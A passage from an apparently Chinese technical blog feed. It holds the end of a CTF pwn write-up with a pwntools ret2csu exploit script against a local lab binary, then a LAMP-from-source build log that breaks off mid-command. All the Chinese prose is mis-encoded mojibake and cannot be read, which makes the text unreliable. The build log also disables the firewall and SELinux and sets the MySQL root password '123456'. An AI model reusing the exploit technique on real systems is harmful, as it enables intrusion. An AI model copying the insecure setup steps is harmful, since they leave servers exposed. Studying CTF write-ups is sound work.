æ§åˆ¶rdxï¼ˆç¬¬ä¸‰ä¸ªå‚æ•°çš„å¯„å­˜å™¨ï¼‰ä¸º<code>0xdeadcafebabebeef</code> å°±å¯ä»¥äº†ã€‚ä½†æ˜¯æ¯”è¾ƒéš¾æçš„ä¸€ç‚¹æ˜¯ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/6lYgiL.png" srcset="/img/loading.gif" alt><br>åœ¨è¿™ä¸ªåœ°æ–¹æ˜¯callï¼Œæ‰€ä»¥è¿™é‡Œåº”è¯¥å¡«ä¸€ä¸ªgotçš„åœ°å€ã€‚ä¸èƒ½æ˜¯ä¸€ä¸ªåœ°å€æˆ–è€…pltã€‚å› ä¸º<code>call 0xaaaaa</code> æ±‡ç¼–ä½œç”¨ï¼š</p><ul><li>push PCï¼ˆä¹Ÿå°±æ˜¯è¯¥æ±‡ç¼–æŒ‡ä»¤çš„ä¸‹ä¸€ä¸ªæ±‡ç¼–æŒ‡ä»¤çš„åœ°å€ï¼‰</li><li><code>jmp [0xaaaaa]</code> æ˜¯è¯¥å‡½æ•°pointæŒ‡å‘çš„åœ°å€</li></ul><p>è¿™ä¸ªé¢˜ç›®åœ¨callå®Œæ¯ä¸€ä¸ªå‡½æ•°è‡ªå¸¦çš„æ­£å¸¸åº“å‡½æ•°åï¼Œéƒ½å°†å…¶gotè¡¨æ¸…0ã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/9we7VY.png" srcset="/img/loading.gif" alt><br>ä½†æ˜¯ä¼šå‘ç°ä¸Šé¢è¿˜æœ‰ä¸€ä¸ªåŠ¨æ€é“¾æ¥<code>_DYNAMIC</code>çš„ä¿¡æ¯ï¼Œè·Ÿè¿›å»ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/iTqAvV.png" srcset="/img/loading.gif" alt><br>å‘ç°ä¸€å †åˆå§‹åŒ–ç”¨çš„å‡½æ•°ã€‚ç„¶åç‚¹è¿›å»ç¬¬ä¸€ä¸ªå¯ä»¥çœ‹çœ‹ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/GAIVGt.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/njC4qf.png" srcset="/img/loading.gif" alt><br>å‘ç°è¿™é‡Œä¹Ÿæ²¡æœ‰å¯¹rdxè¿›è¡Œå¤„ç†ï¼Œå¯ä»¥ä½¿ç”¨è¿™ä¸ªã€‚ç°åœ¨å°±æ˜¯ç¡®å®šä¸€ä¸‹å“ªé‡Œå­˜æ”¾ç€<code>0x400560</code>ï¼Œæ¯«æ— ç–‘é—®è‚¯å®šæ˜¯è¿™ä¸ª<code>_DYNAMIC</code>é‡Œï¼Œä½†æ˜¯è‡ªå·±ç›®å‰è¿˜ä¸ç†Ÿæ‚‰è¿™ä¸ªç»“æ„ï¼Œçœ‹èµ·æ¥è²Œä¼¼æ˜¯ä¸ªç»“æ„ä½“ã€‚å…ˆgdbè·Ÿå…¥æŸ¥çœ‹å§ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/wzkBKI.png" srcset="/img/loading.gif" alt><br>å‘ç°åº”è¯¥æ˜¯<code>0x0600E38</code>ã€‚æ¥ä¸‹æ¥çš„å°±ç®€å•äº†ï¼Œä¼ ç»Ÿçš„ret2csuã€‚</p><h3 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.arch = <span class="hljs-string">'amd64'</span>context.log_level = <span class="hljs-string">'debug'</span>io = process(<span class="hljs-string">'./ret2csu'</span>)elf = ELF(<span class="hljs-string">'./ret2csu'</span>)offset = <span class="hljs-number">40</span>io.recvuntil(<span class="hljs-string">'&gt;'</span>)key1 = <span class="hljs-number">0x040089A</span>key2 = <span class="hljs-number">0x000400880</span>key3 = <span class="hljs-number">0x0000600E38</span>raw_input(<span class="hljs-string">'-&gt;'</span>)payload = offset * <span class="hljs-string">'a'</span> + flat([key1,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,key3,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0xdeadcafebabebeef</span>,key2,<span class="hljs-number">7</span>*<span class="hljs-number">8</span>*<span class="hljs-string">'a'</span>,<span class="hljs-number">0x000004007B1</span>])io.sendline(payload)io.interactive()</code></pre></div>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux- Lampæ­å»ºè®°å½•</title>
    <link href="/2020/04/08/linux_%20Lamp%E6%90%AD%E5%BB%BA%E8%AE%B0%E5%BD%95/"/>
    <url>/2020/04/08/linux_%20Lamp%E6%90%AD%E5%BB%BA%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h1 id="Lampæ­å»ºè®°å½•"><a href="#Lampæ­å»ºè®°å½•" class="headerlink" title="Lampæ­å»ºè®°å½•"></a>Lampæ­å»ºè®°å½•</h1><h2 id="å‡†å¤‡å·¥ä½œ"><a href="#å‡†å¤‡å·¥ä½œ" class="headerlink" title="å‡†å¤‡å·¥ä½œ"></a>å‡†å¤‡å·¥ä½œ</h2><h3 id="å®‰è£…ç¼–è¯‘ç¯å¢ƒï¼š"><a href="#å®‰è£…ç¼–è¯‘ç¯å¢ƒï¼š" class="headerlink" title="å®‰è£…ç¼–è¯‘ç¯å¢ƒï¼š"></a>å®‰è£…ç¼–è¯‘ç¯å¢ƒï¼š</h3><div class="hljs"><pre><code class="hljs undefined">yum -y <span class="hljs-keyword">install</span> gcc*</code></pre></div><p>å®‰è£…å¥½åè®°å¾—å…³é—­é˜²ç«å¢™å’Œselinux</p><h3 id="å‡†å¤‡è½¯ä»¶åŒ…"><a href="#å‡†å¤‡è½¯ä»¶åŒ…" class="headerlink" title="å‡†å¤‡è½¯ä»¶åŒ…"></a>å‡†å¤‡è½¯ä»¶åŒ…</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/phSpwE.png" srcset="/img/loading.gif" alt><br>æŠŠè¿™äº›å®‰è£…åŒ…éƒ½æ”¾å…¥è™šæ‹Ÿæœºè‡ªå®šä¹‰çš„è·¯å¾„ï¼Œç­‰å¾…ä½¿ç”¨ã€‚</p><h3 id="shellè„šæœ¬æ‰¹é‡è§£åŒ…"><a href="#shellè„šæœ¬æ‰¹é‡è§£åŒ…" class="headerlink" title="shellè„šæœ¬æ‰¹é‡è§£åŒ…"></a>shellè„šæœ¬æ‰¹é‡è§£åŒ…</h3><div class="hljs"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span>/bin/ls *tar.gz &gt; ls.list/bin/ls *tgz &gt;&gt; ls.list<span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> `cat ls.list`<span class="hljs-keyword">do</span>        /bin/tar -zxf <span class="hljs-variable">$a</span><span class="hljs-keyword">done</span>rm -rf ls.list</code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/YX4fnr.png" srcset="/img/loading.gif" alt><br>ç„¶åå¼€å§‹ä¸€ä¸€çš„è£…åŒ…ï¼Œæ³¨æ„éœ€è¦æŒ‰ç…§ä¸€å®šçš„é¡ºåºæ¥è£…çš„ã€‚</p><h2 id="python-devel"><a href="#python-devel" class="headerlink" title="python-devel"></a>python-devel</h2><div class="hljs"><pre><code class="hljs bash">yum -y install python-devel</code></pre></div><p>å®‰è£…pythonçš„åº•å±‚ç¯å¢ƒã€‚</p><div class="hljs"><pre><code class="hljs bash">[root@localhost lamp1]<span class="hljs-comment"># cd libxml2-2.9.1/</span>[root@localhost libxml2-2.9.1]<span class="hljs-comment"># ./configure --prefix=/usr/local/libxml2/</span>[root@localhost libxml2-2.9.1]<span class="hljs-comment"># make</span>[root@localhost libxml2-2.9.1]<span class="hljs-comment"># make install</span></code></pre></div><h2 id="libmcrypt"><a href="#libmcrypt" class="headerlink" title="libmcrypt"></a>libmcrypt</h2><p>æä¾›ä¸€äº›åŠ å¯†ç®—æ³•ï¼š</p><div class="hljs"><pre><code class="hljs bash">[root@localhost lamp1]<span class="hljs-comment"># cd libmcrypt-2.5.8/</span>[root@localhost libmcrypt-2.5.8]<span class="hljs-comment"># ./configure --prefix=/usr/local/libmcrypt/</span>[root@localhost libmcrypt-2.5.8]<span class="hljs-comment"># make</span>[root@localhost libmcrypt-2.5.8]<span class="hljs-comment"># make install</span></code></pre></div><h2 id="libltdl"><a href="#libltdl" class="headerlink" title="libltdl"></a>libltdl</h2><div class="hljs"><pre><code class="hljs bash">[root@localhost lamp1]<span class="hljs-comment"># cd libmcrypt-2.5.8/libltdl/</span>[root@localhost libltdl]<span class="hljs-comment"># ./configure --enable-ltdl-install</span>[root@localhost libltdl]<span class="hljs-comment"># make</span>[root@localhost libltdl]<span class="hljs-comment"># make install</span></code></pre></div><h2 id="mhash"><a href="#mhash" class="headerlink" title="mhash"></a>mhash</h2><p>æä¾›åŠ å¯†æ–¹å¼çš„æ‰©å±•</p><div class="hljs"><pre><code class="hljs bash">[root@localhost lamp1]<span class="hljs-comment"># cd mhash-0.9.9.9/</span>[root@localhost mhash-0.9.9.9]<span class="hljs-comment"># ./configure</span></code></pre></div><h2 id="mcrypt"><a href="#mcrypt" class="headerlink" title="mcrypt"></a>mcrypt</h2><p>æä¾›phpç›¸å…³çš„åŠ å¯†æ”¯æŒæ‹“å±•åº“</p><div class="hljs"><pre><code class="hljs bash">[root@localhost mcrypt-2.6.8]<span class="hljs-comment"># LD_LIBRARY_PATH=/usr/local/libmcrypt/lib:/usr/local/lib \./configure --with-libmcrypt-prefix=/usr/local/libmcrypt</span>[root@localhost mcrypt-2.6.8]<span class="hljs-comment"># make</span>[root@localhost mcrypt-2.6.8]<span class="hljs-comment"># make install</span></code></pre></div><h2 id="zlib"><a href="#zlib" class="headerlink" title="zlib"></a>zlib</h2><p>æä¾›å‹ç¼©ç”¨é€”çš„å‡½æ•°åº“</p><div class="hljs"><pre><code class="hljs bash">[roott@localhost lamp1]<span class="hljs-comment"># cd zlib-1.2.3/</span>[root@localhost zlib-1.2.3]<span class="hljs-comment"># ./configure</span>[root@localhost zlib-1.2.3]<span class="hljs-comment"># make</span>[root@localhost zlib-1.2.3]<span class="hljs-comment"># make install</span></code></pre></div><h2 id="libpng"><a href="#libpng" class="headerlink" title="libpng"></a>libpng</h2><div class="hljs"><pre><code class="hljs bash">[root@localhost zlib-1.2.3]<span class="hljs-comment"># cd ../</span>[root@localhost lamp1]<span class="hljs-comment"># cd libpng-1.2.31/</span>[root@localhost libpng-1.2.31]<span class="hljs-comment"># ./configure --prefix=/usr/local/libpng</span>[root@localhost libpng-1.2.31]<span class="hljs-comment"># make </span>[root@localhost libpng-1.2.31]<span class="hljs-comment"># make install</span></code></pre></div><p>å¦‚æœå‡ºç°ï¼š</p><div class="hljs"><pre><code class="hljs bash">/usr/bin/ld: //usr/<span class="hljs-built_in">local</span>/lib/libz.a(crc32.o): relocation R_X86_64_32 against `.rodata<span class="hljs-string">' can not be used when making a shared object; recompile with -fPIC</span></code></pre></div><p>è§£å†³åŠæ³• ï¼š </p><div class="hljs"><pre><code class="hljs bash">[root@localhost lamp1]<span class="hljs-comment"># cd zlib-1.2.3 //è¿›å…¥zlibç›®å½•</span>[root@localhost zlib-1.2.3]<span class="hljs-comment"># ./configure</span>[root@localhost zlib-1.2.3]<span class="hljs-comment"># CFLAGS="-O3 -fPIC" ./configure Â  --prefix=/usr/local/zlib/ #ä½¿ç”¨64ä½å…ƒçš„æ–¹æ³•è¿›è¡Œç¼–è¯‘</span>[root@localhost zlib-1.2.3]<span class="hljs-comment"># make</span>[root@localhost zlib-1.2.3]<span class="hljs-comment"># make install</span>[root@localhost zlib-1.2.3]<span class="hljs-comment"># make clean</span></code></pre></div><p>ç„¶ååœ¨é‡æ–°æ¥å®‰è£…libpngå³å¯ã€‚</p><h2 id="jpeg6"><a href="#jpeg6" class="headerlink" title="jpeg6"></a>jpeg6</h2><p>æä¾›jpegæ ¼å¼çš„å›¾ç‰‡</p><div class="hljs"><pre><code class="hljs bash">[root@localhost libpng-1.2.31]<span class="hljs-comment"># mkdir /usr/local/jpeg6</span>[root@localhost libpng-1.2.31]<span class="hljs-comment"># mkdir /usr/local/jpeg6/bin</span>[root@localhost libpng-1.2.31]<span class="hljs-comment"># mkdir /usr/local/jpeg6/lib</span>[root@localhost libpng-1.2.31]<span class="hljs-comment"># mkdir /usr/local/jpeg6/include</span>[root@localhost libpng-1.2.31]<span class="hljs-comment"># mkdir -p /usr/local/jpeg6/man/man1</span></code></pre></div><div class="hljs"><pre><code class="hljs bash">root@localhost lamp]<span class="hljs-comment"># cd jpeg-6b/</span>[root@localhost jpeg-6b]<span class="hljs-comment"># ./configure --prefix=/usr/local/jpeg6/ --enable-shared --enable-static</span></code></pre></div><p>å¦‚æœå‘ç”Ÿè¿™æ ·çš„æŠ¥é”™ï¼š</p><div class="hljs"><pre><code class="hljs bash">[root@localhost jpeg-6b]<span class="hljs-comment"># make</span>./libtool --mode=compile gcc -O2  -I. -c ./jcapimin.cmake: ./libtoolï¼šå‘½ä»¤æœªæ‰¾åˆ°make: *** [jcapimin.lo] é”™è¯¯ 127</code></pre></div><p>éœ€è¦ï¼š</p><div class="hljs"><pre><code class="hljs bash">[root@localhost jpeg-6b]<span class="hljs-comment"># yum -y install libtool</span>[root@localhost jpeg-6b]<span class="hljs-comment"># cp /usr/share/libtool/config/config.guess .</span>cpï¼šæ˜¯å¦è¦†ç›–<span class="hljs-string">"./config.guess"</span>ï¼Ÿ yes[root@localhost jpeg-6b]<span class="hljs-comment"># make clean</span></code></pre></div><p>é‡æ–°å†æ¥å°±å¥½ã€‚</p><h2 id="freetype"><a href="#freetype" class="headerlink" title="freetype"></a>freetype</h2><p>å­—ä½“åº“ã€‚</p><div class="hljs"><pre><code class="hljs bash">[root@localhost freetype-2.3.5]<span class="hljs-comment"># ./configure --prefix=/usr/local/freetype</span></code></pre></div><h2 id="GD"><a href="#GD" class="headerlink" title="GD"></a>GD</h2><p>ç»™phpæä¾›å›¾å½¢æ‹“å±•çš„åº“</p><div class="hljs"><pre><code class="hljs bash">[root@localhost lamp]<span class="hljs-comment"># mkdir /usr/local/gd2</span>[root@localhost lamp]<span class="hljs-comment"># cd /usr/src/lamp/gd-2.0.35/</span>[root@localhost gd-2.0.35]<span class="hljs-comment"># ./configure --prefix=/usr/local/gd2/ --with-jpeg=/usr/local/jpeg6/ --with-freetype=/usr/local/freetype/ --with-png=/usr/local/libpng/</span></code></pre></div><p>è¿™æ ·ä¼šçˆ†ä¸€ä¸ªé”™ï¼Œç„¶åéœ€è¦æ”¹ä¸€ä¸‹æºç ï¼š</p><div class="hljs"><pre><code class="hljs bash">[root@localhost gd-2.0.35]<span class="hljs-comment"># vim gd_png.c</span></code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/3NJrzC.png" srcset="/img/loading.gif" alt><br>éœ€è¦æŒ‡å®šä¸€ä¸‹è·¯å¾„å³å¯ï¼Œè¿™ä¸ªåˆšåˆšæ˜¯å·²ç»å®‰è£…è¿‡çš„ã€‚</p><h2 id="httped"><a href="#httped" class="headerlink" title="httped"></a>httped</h2><p>å…ˆè£…ä¸¤ä¸ªå·¥å…·åŒ…ï¼š</p><div class="hljs"><pre><code class="hljs undefined">cp -r apr<span class="hljs-number">-1.4</span><span class="hljs-number">.6</span> httpd<span class="hljs-number">-2.4</span><span class="hljs-number">.7</span>/srclib/aprcp -r apr-util<span class="hljs-number">-1.4</span><span class="hljs-number">.1</span> httpd<span class="hljs-number">-2.4</span><span class="hljs-number">.7</span>/srclib/apr-util</code></pre></div><h3 id="å¼€å§‹è£…httpedï¼š"><a href="#å¼€å§‹è£…httpedï¼š" class="headerlink" title="å¼€å§‹è£…httpedï¼š"></a>å¼€å§‹è£…httpedï¼š</h3><p>å…ˆè¿›å…¥è£…ä¸€ä¸‹pcreï¼š</p><div class="hljs"><pre><code class="hljs undefined">./configure<span class="hljs-built_in">make</span><span class="hljs-built_in">make</span> install</code></pre></div><p>è¿›å…¥httpedï¼š<br>å…ˆå¯¹é…ç½®è¿›è¡Œè®¾ç½®ï¼š</p><div class="hljs"><pre><code class="hljs undefined">./configure <span class="hljs-attribute">--prefix</span>=/usr/local/apache2/ <span class="hljs-attribute">--sysconfdir</span>=/usr/local/apache2/etc --with-include-apr --enable-so <span class="hljs-attribute">--enable-deflate</span>=shared <span class="hljs-attribute">--enable-expires</span>=shared <span class="hljs-attribute">--enable-rewrite</span>=sharedmakemake install</code></pre></div><h3 id="å¼€æœåŠ¡ï¼š"><a href="#å¼€æœåŠ¡ï¼š" class="headerlink" title="å¼€æœåŠ¡ï¼š"></a>å¼€æœåŠ¡ï¼š</h3><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/apache2/</span>bin<span class="hljs-regexp">/apachectl start</span></code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/hdY4Sy.png" srcset="/img/loading.gif" alt></p><h3 id="è‡ªå¯åŠ¨"><a href="#è‡ªå¯åŠ¨" class="headerlink" title="è‡ªå¯åŠ¨"></a>è‡ªå¯åŠ¨</h3><div class="hljs"><pre><code class="hljs undefined">[<span class="hljs-symbol">root@</span>localhost httpd<span class="hljs-number">-2.4</span><span class="hljs-number">.7</span>]# vim /etc/rc.d/rc.local</code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/eqeQsw.png" srcset="/img/loading.gif" alt></p><p>è®¾ç½®å¼€æœºæ—¶è‡ªåŠ¨å¯åŠ¨è¿™ä¸ªæœåŠ¡ã€‚</p><h2 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h2><h3 id="å‡†å¤‡å·¥ä½œ-1"><a href="#å‡†å¤‡å·¥ä½œ-1" class="headerlink" title="å‡†å¤‡å·¥ä½œ"></a>å‡†å¤‡å·¥ä½œ</h3><p>è£…ä¸¤ä¸ªå·¥å…·ï¼š</p><div class="hljs"><pre><code class="hljs undefined">[root<span class="hljs-symbol">@localhost</span> <span class="hljs-keyword">local</span>]<span class="hljs-meta"># yum -y install cmake</span>[root<span class="hljs-symbol">@localhost</span> <span class="hljs-keyword">local</span>]<span class="hljs-meta"># yum -y install bison</span>[root<span class="hljs-symbol">@localhost</span> <span class="hljs-keyword">local</span>]<span class="hljs-meta"># yum -y install ncurses-devel</span></code></pre></div><p>å»ºç«‹ä¸€ä¸ªç”¨æˆ·ï¼š</p><div class="hljs"><pre><code class="hljs undefined">[root<span class="hljs-symbol">@localhost</span> <span class="hljs-keyword">local</span>]<span class="hljs-meta"># useradd mysql</span>[root<span class="hljs-symbol">@localhost</span> <span class="hljs-keyword">local</span>]<span class="hljs-meta"># id mysql</span>uid=<span class="hljs-number">1001</span>(mysql) gid=<span class="hljs-number">1001</span>(mysql) ç»„=<span class="hljs-number">1001</span>(mysql)</code></pre></div><p>å®‰è£…ncursesï¼š</p><div class="hljs"><pre><code class="hljs undefined">[<span class="hljs-symbol">root@</span>localhost ncurses<span class="hljs-number">-5.9</span>]# ./configure --with-<span class="hljs-keyword">shared</span> --without-debug --with-ada --enable-overwrite[<span class="hljs-symbol">root@</span>localhost ncurses<span class="hljs-number">-5.9</span>]# make[<span class="hljs-symbol">root@</span>localhost ncurses<span class="hljs-number">-5.9</span>]# make install</code></pre></div><h3 id="å¼€å§‹å®‰è£…"><a href="#å¼€å§‹å®‰è£…" class="headerlink" title="å¼€å§‹å®‰è£…"></a>å¼€å§‹å®‰è£…</h3><div class="hljs"><pre><code class="hljs undefined">[root@localhost mysql-5.5.23]# cmake <span class="hljs-attribute">-DCMAKE_INSTALL_PREFIX</span>=/usr/local/mysql \&gt; <span class="hljs-attribute">-DMYSQL_UNIX_ADDR</span>=/tmp/mysql.sock <span class="hljs-attribute">-DEXTRA_CHARSET</span>=all <span class="hljs-attribute">-DDEFAULT_CHARSET</span>=utf8 \&gt; <span class="hljs-attribute">-DDEFAULT_COLLATION</span>=utf8_general_ci <span class="hljs-attribute">-DWITH_MYISAM_STORAGE_ENGINE</span>=1 \&gt; <span class="hljs-attribute">-DWITH_INNOBASE_STORAGE_ENGINE</span>=1 <span class="hljs-attribute">-DWITH_MEMORY_STORAGE_ENGINE</span>=1 \&gt; <span class="hljs-attribute">-DWITH_READLINE</span>=1 <span class="hljs-attribute">-DENABLED_LOCAL_INFILE</span>=1 <span class="hljs-attribute">-DMYSQL_USER</span>=mysql \&gt; <span class="hljs-attribute">-DMYSQL_TCP_PORT</span>=3306</code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/kEl78g.png" srcset="/img/loading.gif" alt></p><div class="hljs"><pre><code class="hljs undefined">[<span class="hljs-symbol">root@</span>localhost  mysql<span class="hljs-number">-5.5</span><span class="hljs-number">.23</span>]# make[<span class="hljs-symbol">root@</span>localhost  mysql<span class="hljs-number">-5.5</span><span class="hljs-number">.23</span>]# make install</code></pre></div><h3 id="ç®€å•è®¾ç½®"><a href="#ç®€å•è®¾ç½®" class="headerlink" title="ç®€å•è®¾ç½®"></a>ç®€å•è®¾ç½®</h3><p>åˆå§‹åŒ–mysqlï¼š</p><div class="hljs"><pre><code class="hljs undefined">[root<span class="hljs-symbol">@localhost</span> mysql]<span class="hljs-meta"># chown -R mysql:mysql .</span>[root<span class="hljs-symbol">@localhost</span> mysql]<span class="hljs-meta"># /usr/local/mysql/scripts/mysql_install_db --user=mysql</span></code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/PIJriB.png" srcset="/img/loading.gif" alt><br>è®¾ç½®æƒé™ï¼š</p><div class="hljs"><pre><code class="hljs undefined">[root<span class="hljs-symbol">@localhost</span> mysql]<span class="hljs-meta"># chown -R root .</span>[root<span class="hljs-symbol">@localhost</span> mysql]<span class="hljs-meta"># chown -R mysql data/</span></code></pre></div><p>è¦†ç›–ä¸€ä¸‹é…ç½®æ–‡ä»¶ï¼š</p><div class="hljs"><pre><code class="hljs undefined">[root@localhost mysql]# <span class="hljs-keyword">cp</span> support-<span class="hljs-keyword">files</span>/my-medium.<span class="hljs-keyword">cnf</span> /etc/my.<span class="hljs-keyword">cnf</span><span class="hljs-keyword">cp</span>ï¼šæ˜¯å¦è¦†ç›–<span class="hljs-string">"/etc/my.cnf"</span>ï¼Ÿ yes</code></pre></div><p>æ¥ç€åˆå§‹åŒ–ï¼š</p><div class="hljs"><pre><code class="hljs undefined">[<span class="hljs-symbol">root@</span>localhost mysql]# /usr/local/mysql/bin/mysqld_safe --user=mysql<span class="hljs-number">200408</span> <span class="hljs-number">03</span>:<span class="hljs-number">38</span>:<span class="hljs-number">45</span> mysqld_safe Logging to <span class="hljs-string">'/usr/local/mysql/data/localhost.localdomain.err'</span>.<span class="hljs-number">200408</span> <span class="hljs-number">03</span>:<span class="hljs-number">38</span>:<span class="hljs-number">45</span> mysqld_safe Starting mysqld daemon with databases <span class="hljs-keyword">from</span> /usr/local/mysql/data<span class="hljs-number">200408</span> <span class="hljs-number">03</span>:<span class="hljs-number">38</span>:<span class="hljs-number">47</span> mysqld_safe mysqld <span class="hljs-keyword">from</span> pid file /usr/local/mysql/data/localhost.localdomain.pid ended[<span class="hljs-symbol">root@</span>localhost mysql]# /usr/local/mysql/scripts/mysql_install_db --user=mysql[<span class="hljs-symbol">root@</span>localhost mysql]# /usr/local/mysql/bin/mysqld_safe --user=mysql</code></pre></div><p>å‘ç°å¡æ­»äº†ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/1KP1pE.png" srcset="/img/loading.gif" alt></p><div class="hljs"><pre><code class="hljs undefined">[<span class="hljs-symbol">root@</span>localhost mysql<span class="hljs-number">-5.5</span><span class="hljs-number">.23</span>]# ps aux | grep mysql</code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/hNLN8i.png" srcset="/img/loading.gif" alt></p><div class="hljs"><pre><code class="hljs undefined">[<span class="hljs-symbol">root@</span>localhost mysql<span class="hljs-number">-5.5</span><span class="hljs-number">.23</span>]# kill <span class="hljs-number">-9</span> <span class="hljs-number">102872</span>[<span class="hljs-symbol">root@</span>localhost mysql<span class="hljs-number">-5.5</span><span class="hljs-number">.23</span>]# ps aux | grep mysqlmysql    <span class="hljs-number">103111</span>  <span class="hljs-number">0.0</span>  <span class="hljs-number">4.9</span> <span class="hljs-number">727288</span> <span class="hljs-number">49260</span> pts/<span class="hljs-number">3</span>    Sl   <span class="hljs-number">03</span>:<span class="hljs-number">39</span>   <span class="hljs-number">0</span>:<span class="hljs-number">00</span> /usr/local/mysql/bin/mysqld --basedir=/usr/local/mysql --datadir=/usr/local/mysql/data --plugin-dir=/usr/local/mysql/lib/plugin --user=mysql --log-error=/usr/local/mysql/data/localhost.localdomain.err --pid-file=/usr/local/mysql/data/localhost.localdomain.pid --socket=/tmp/mysql.sock --port=<span class="hljs-number">3306</span>root     <span class="hljs-number">103201</span>  <span class="hljs-number">0.0</span>  <span class="hljs-number">0.0</span> <span class="hljs-number">112728</span>   <span class="hljs-number">972</span> pts/<span class="hljs-number">2</span>    S+   <span class="hljs-number">03</span>:<span class="hljs-number">46</span>   <span class="hljs-number">0</span>:<span class="hljs-number">00</span> grep --color=<span class="hljs-built_in">auto</span> mysql</code></pre></div><p>æ€æ‰é‡æ–°æ¥ã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/CoNvVo.png" srcset="/img/loading.gif" alt></p><div class="hljs"><pre><code class="hljs undefined">[root@localhost mysql]# /usr/<span class="hljs-keyword">local</span>/mysql/scripts/mysql_install_db <span class="hljs-comment">--user=mysql</span>[root@localhost mysql]# /usr/<span class="hljs-keyword">local</span>/mysql/bin/mysqld_safe <span class="hljs-comment">--user=mysql</span></code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/a9Mt08.png" srcset="/img/loading.gif" alt><br>æˆåŠŸäº†ã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/fUs1Vd.png" srcset="/img/loading.gif" alt></p><h3 id="è‡ªå¯åŠ¨-1"><a href="#è‡ªå¯åŠ¨-1" class="headerlink" title="è‡ªå¯åŠ¨"></a>è‡ªå¯åŠ¨</h3><div class="hljs"><pre><code class="hljs undefined">[<span class="hljs-symbol">root@</span>localhost mysql<span class="hljs-number">-5.5</span><span class="hljs-number">.23</span>]# vim /etc/rc.d/rc.local</code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/HTfqIB.png" srcset="/img/loading.gif" alt></p><h3 id="è®¾ç½®mysqlå¯†ç "><a href="#è®¾ç½®mysqlå¯†ç " class="headerlink" title="è®¾ç½®mysqlå¯†ç "></a>è®¾ç½®mysqlå¯†ç </h3><div class="hljs"><pre><code class="hljs undefined">[<span class="hljs-symbol">root@</span>localhost mysql<span class="hljs-number">-5.5</span><span class="hljs-number">.23</span>]# /usr/local/mysql/bin/mysqladmin -u root password <span class="hljs-string">"123456"</span>[<span class="hljs-symbol">root@</span>localhost mysql<span class="hljs-number">-5.5</span><span class="hljs-number">.23</span>]# /usr/local/mysql/bin/mysql -u root -p</code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/yHAmIC.png" srcset="/img/loading.gif" alt><br>æˆåŠŸäº†ã€‚æ³¨æ„ <code>history -c</code> æ¸…æ¥šå†å²è®°å½•å‘½ä»¤ã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/SeHAFf.png" srcset="/img/loading.gif" alt><br>æœåŠ¡éƒ½æ­£å¸¸ï¼Œå­—ç¬¦é›†æ ¼å¼ä¹Ÿåœ¨ã€‚</p><h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><h3 id="å‡†å¤‡å·¥ä½œ-2"><a href="#å‡†å¤‡å·¥ä½œ-2" class="headerlink" title="å‡†å¤‡å·¥ä½œ"></a>å‡†å¤‡å·¥ä½œ</h3><div class="hljs"><pre><code class="hljs undefined">[root<span class="hljs-symbol">@localhost</span> mysql]<span class="hljs-meta"># yum -y install libtool*</span>[root<span class="hljs-symbol">@localhost</span> <span class="hljs-keyword">local</span>]<span class="hljs-meta"># yum -y install libpng-devel</span></code></pre></div><p>è®©phpæ”¯æŒæ•°æ®åº“çš„å†…å®¹ï¼š</p><div class="hljs"><pre><code class="hljs undefined">[root<span class="hljs-symbol">@localhost</span> mysql]<span class="hljs-meta"># vim /usr/local/gd2/<span class="hljs-meta-keyword">include</span>/gd_io.h</span></code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/MGWJ0l.png" srcset="/img/loading.gif" alt></p><h3 id="å¼€å§‹å®‰è£…-1"><a href="#å¼€å§‹å®‰è£…-1" class="headerlink" title="å¼€å§‹å®‰è£…"></a>å¼€å§‹å®‰è£…</h3><div class="hljs"><pre><code class="hljs undefined">[root@localhost php-5.4.25]# ./configure <span class="hljs-attribute">--prefix</span>=/usr/local/php/ <span class="hljs-attribute">--with-config-file-path</span>=/usr/local/php/etc/ <span class="hljs-attribute">--with-apxs2</span>=/usr/local/apache2/bin/apxs <span class="hljs-attribute">--with-mysql</span>=/usr/local/mysql <span class="hljs-attribute">--with-libxml-dir</span>=/usr/local/libxml2 <span class="hljs-attribute">--with-jpeg-dir</span>=/usr/local/jpeg6/ <span class="hljs-attribute">--with-png-dir</span>=/usr/local/libpng/ <span class="hljs-attribute">--with-freetype-dir</span>=/usr/local/freetype/ <span class="hljs-attribute">--with-gd</span>=/usr/local/gd2/ <span class="hljs-attribute">--with-mcrypt</span>=/usr/local/libmcrypt/ <span class="hljs-attribute">--with-mysqli</span>=/usr/local/mysql/bin/mysql_config --enable-soap <span class="hljs-attribute">--enable-mbstring</span>=all --enable-sockets <span 